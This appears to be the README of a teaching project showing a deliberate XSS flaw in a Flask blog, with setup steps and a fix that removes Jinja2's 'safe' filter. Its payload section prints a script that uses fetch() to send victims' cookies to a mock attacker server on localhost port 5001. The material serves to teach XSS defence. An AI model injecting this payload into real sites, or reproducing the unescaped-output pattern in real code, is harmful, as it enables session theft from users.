# Cross-Site Scripting (XSS) Demonstration Project

This project is a demonstration of Cross-Site Scripting (XSS) vulnerabilities in a full-stack web application built using Flask and SQLite. It includes a vulnerable implementation of a blog platform where users can submit posts and comments, intentionally introducing an XSS vulnerability. The project also demonstrates how to mitigate this vulnerability.

## Features
- **Flask Framework**: The web application is built using Flask, a lightweight Python web framework.
- **SQLite Database**: SQLite is used as the database backend to store blog posts and comments.
- **XSS Demonstration**: An intentionally introduced XSS vulnerability.
- **XSS Mitigation**: Demonstration of how to fix the XSS vulnerability using proper sanitization and escaping.

## Setup Instructions

### 1. Clone the repository

```bash
git clone https://github.com/naibwedi/Cross-Site-Scripting.git
cd Cross-Site-Scripting
```

## 2. Create a virtual environment
It is recommended to create a virtual environment to isolate dependencies:

bash
Copy code
python3 -m venv venv
source venv/bin/activate  # On Windows: venv\Scripts\activate
3. Install dependencies
Install the required dependencies listed in the requirements.txt file:

```bash
pip install -r requirements.txt
```
4. Set up the SQLite database
Initialize the SQLite database. The database file (app.db) will be created and migrations will be applied.

```bash
flask db init
flask db migrate -m "initial migration"
flask db upgrade
```
Alternatively, you can initialize the database in the Flask shell:

```bash
flask shell
from app import db
db.create_all()
exit()
```
## 5. Run the application
To start the Flask development server, run:


Visit http://127.0.0.1:5000/ in your browser to see the application.

## Project Structure
Here’s the structure of the project:

bash
Copy code
/your_project
    /templates
        index.html         # Homepage template to display all posts
        add_post.html      # Template for adding new posts
        post.html          # Template for viewing a single post and its comments
    app.py                 # Flask application logic
    config.py              # Configuration settings for Flask
    requirements.txt       # List of Python dependencies
app.py: This is the main Flask application file where routes are defined, models are set up, and the database is managed.
config.py: Contains configuration for the app, such as the secret key and database URI.
templates/: Holds the HTML templates that render the content for different routes (blog posts, comments, etc.).
requirements.txt: Lists all the dependencies needed to run the project.
How the XSS Vulnerability Works
In this project, users can create blog posts or comments. When an attacker injects malicious JavaScript code into a post or comment, it is executed when other users view the post. This demonstrates a typical Cross-Site Scripting (XSS) attack.

##Example XSS Payload
Here is an example payload that could be used to steal cookies from the user's browser:

```html
<script>
    fetch('http://127.0.0.1:5001/steal-cookie?cookie=' + document.cookie);
</script>
```
This script sends the user’s cookies, including their session information, to a malicious server (in this case, http://127.0.0.1:5001).

When the victim views the post containing this malicious payload, the script will automatically execute and send the user's session cookie to the attacker's server.

## Mitigation
To mitigate XSS vulnerabilities, user inputs must be properly sanitized and escaped before being rendered on the page. This project includes steps to fix the vulnerability using Flask's built-in mechanisms.

# Steps to Fix the XSS Vulnerability:
Input Validation: Ensure that user inputs are validated before being saved.
Escaping Output: Use Flask’s Jinja2 templating system to automatically escape user inputs when rendering them on the page.
For example, replace {{ post.content | safe }} with {{ post.content }} to ensure that the content is escaped properly, preventing scripts from being executed.
